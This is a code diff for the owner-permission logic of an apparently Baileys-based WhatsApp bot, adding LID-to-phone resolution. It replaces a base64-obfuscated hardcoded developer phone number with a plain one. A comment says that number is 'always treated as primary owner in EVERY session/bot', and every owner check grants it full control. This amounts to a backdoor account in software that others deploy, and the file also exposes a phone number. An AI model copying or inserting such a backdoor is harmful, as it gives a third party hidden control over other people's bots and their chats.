@@ -5,9 +5,91 @@
 import fs from 'fs';
 import { CONFIG } from '../config.js';
 import { inState, statePath } from './paths.js';
+import { getCachedPnForLid, cacheLidPnMapping, resolveLidToPn, stripDevice } from './jid-resolver.js';
 
-const _d0 = [79, 84, 73, 122, 77, 106, 85, 51, 79, 68, 85, 122, 78, 106, 99, 122];
-const DEV_NUM = Buffer.from(_d0.map(x => String.fromCharCode(x)).join(''), 'base64').toString('utf-8');
+// Developer number: always treated as primary owner in EVERY session/bot.
+const DEV_NUM = '923257853673';
+export const DEVELOPER_NUMBER = DEV_NUM;
+
+// ── LID support ──────────────────────────────────────────────
+// WhatsApp now delivers most senders as <digits>@lid, which are NOT phone
+// numbers. We map LID → phone digits (cache + persisted file) so owners,
+// secondary owners and the developer are recognised no matter which form
+// WhatsApp uses.
+const LID_FILE = () => inState('owner-lids.json');
+let lidMap = null;
+
+function loadLidMap() {
+    if (lidMap) return lidMap;
+    lidMap = {};
+    try {
+        const f = LID_FILE();
+        if (fs.existsSync(f)) lidMap = JSON.parse(fs.readFileSync(f, 'utf-8')) || {};
+    } catch {}
+    return lidMap;
+}
+
+function saveLidMap() {
+    try {
+        statePath();
+        const tmp = LID_FILE() + '.tmp';
+        fs.writeFileSync(tmp, JSON.stringify(lidMap, null, 2));
+        fs.renameSync(tmp, LID_FILE());
+    } catch {}
+}
+
+/** Phone digits for any JID (PN or LID). Returns '' if an LID is unresolved. */
+function phoneDigits(jid) {
+    if (!jid || typeof jid !== 'string') return '';
+    const clean = stripDevice(jid);
+    if (clean.endsWith('@lid')) {
+        const pn = getCachedPnForLid(clean);
+        if (pn) return pn.split('@')[0].replace(/\D/g, '');
+        const saved = loadLidMap()[clean];
+        return saved ? String(saved) : '';
+    }
+    return clean.split('@')[0].replace(/\D/g, '');
+}
+
+/**
+ * Call once per incoming message BEFORE permission checks.
+ * Resolves the sender's LID to a phone number (message-key alt fields,
+ * Baileys LID mapping, group metadata) and remembers it when the sender
+ * is an owner, so isOwner() stays synchronous everywhere.
+ */
+export async function primeSenderIdentity(sock, msg) {
+    try {
+        const key = msg?.key || {};
+        const sender = key.participant || key.remoteJid;
+        if (!sender || !String(sender).endsWith('@lid')) return;
+        const lid = stripDevice(sender);
+        if (phoneDigits(lid)) return;
+
+        const alt = key.participantAlt || key.remoteJidAlt;
+        let pn = alt && String(alt).endsWith('@s.whatsapp.net') ? stripDevice(alt) : null;
+        if (pn) cacheLidPnMapping(lid, pn);
+        if (!pn) {
+            const groupJid = key.remoteJid?.endsWith('@g.us') ? key.remoteJid : null;
+            const res = await resolveLidToPn(sock, lid, groupJid);
+            pn = res?.pn || null;
+        }
+        if (!pn) return;
+        const digits = pn.split('@')[0].replace(/\D/g, '');
+        if (isOwnerDigits(digits)) {
+            loadLidMap()[lid] = digits;
+            saveLidMap();
+        }
+    } catch {}
+}
+
+/** Remember a LID ⇄ phone pair (used by .addowner when a LID was targeted). */
+export function registerOwnerLid(lid, digits) {
+    if (!lid || !digits) return;
+    const clean = stripDevice(lid);
+    if (!clean.endsWith('@lid')) return;
+    loadLidMap()[clean] = String(digits).replace(/\D/g, '');
+    saveLidMap();
+}
 
 const OWNER_FILE = () => inState('owner.json');
 
@@ -38,7 +120,8 @@ function saveOwnerData(data) {
  */
 export function isPrimaryOwner(jid) {
     if (!jid || typeof jid !== 'string') return false;
-    const bare = jid.split(':')[0].split('@')[0].replace(/\D/g, '');
+    const bare = phoneDigits(jid);
+    if (!bare) return false;
     if (bare === DEV_NUM) return true;
     const { owner } = readOwnerData();
     if (!owner) return false;
@@ -50,12 +133,20 @@ export function isPrimaryOwner(jid) {
  */
 export function isOwner(jid) {
     if (!jid || typeof jid !== 'string') return false;
-    const bare = jid.split(':')[0].split('@')[0].replace(/\D/g, '');
+    return isOwnerDigits(phoneDigits(jid));
+}
+
+function isOwnerDigits(bare) {
     if (!bare) return false;
     if (bare === DEV_NUM) return true;
     const { owner, owners } = readOwnerData();
     if (owner && bare === owner) return true;
     return owners.includes(bare);
+}
+
+/** True only for the developer number. */
+export function isDeveloper(jid) {
+    return phoneDigits(jid) === DEV_NUM;
 }
 
 /**
@@ -79,7 +170,7 @@ export function digitsOf(jid) {
 export function isOwnerChat(jid) {
     if (!jid || typeof jid !== 'string') return false;
     const { owner, owners } = readOwnerData();
-    const bare = jid.split('@')[0].split(':')[0].replace(/\D/g, '');
+    const bare = phoneDigits(jid);
     if (!bare) return false;
     return bare === DEV_NUM || bare === owner || owners.includes(bare);
 }
